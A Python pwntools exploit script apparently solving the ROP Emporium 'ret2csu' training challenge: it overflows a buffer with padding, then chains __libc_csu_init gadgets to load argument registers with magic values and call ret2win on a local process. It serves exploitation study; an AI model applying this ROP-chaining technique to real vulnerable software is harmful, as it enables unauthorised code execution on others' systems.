from pwn import *

binary = './ret2csu'
elf = ELF(binary)
rop = ROP(elf)
libc = ELF('libret2csu.so',False)

#useful gadgets
#0x000000000040069a pop r12, r13, r14, r15, ret
#0x0000000000400680 mov rdx,r15
#0x00601028 .data address

# Our two __libc_csu_init rop gadgets
csuGadget0 = p64(0x000000000040069a)
csuGadget1 = p64(0x0000000000400680)

# Address of ret2win and _init pointer
ret2win = p64(elf.symbols.ret2win)
initPtr = p64(0x600e38)

padding = b"A"*40
payload = padding
payload += csuGadget0
payload += p64(0x0) # RBX pop rbx - set to 0 since it will be incremented later
payload += p64(0x1) # RBP pop rbp - set to 1 so when compared to the incremented rbx results in equality
payload += initPtr # R12, will be called in `CALL qword ptr [R12 + RBX*0x8]`
payload += p64(0xdeadbeefdeadbeef) # RDI pop r13
payload += p64(0xcafebabecafebabe) # RSI pop r14
payload += p64(0xd00df00dd00df00d) # RDX pop r15

# Our second gadget, and the corresponding stack values
payload += csuGadget1
payload += p64(0x0) # qword value for the ADD RSP, 0x8 adjustment
payload += p64(0x0) # RBX
payload += p64(0x0) # RBP
payload += p64(0x0) # R12
payload += p64(0x0) # R13
payload += p64(0x0) # R14
payload += p64(0x0) # R15
payload += p64(0x00000000004006a3) #pop rdi
payload += p64(0xdeadbeefdeadbeef) #update rdi with correct unconstrained content
# payload += p64(0x00000000004004e6) #ret
payload += ret2win

io = process(binary)

if args.GDB:
	gdbscript="""
	"""
	gdb.attach(io, gdbscript=gdbscript)

io.sendline(payload)

io.interactive()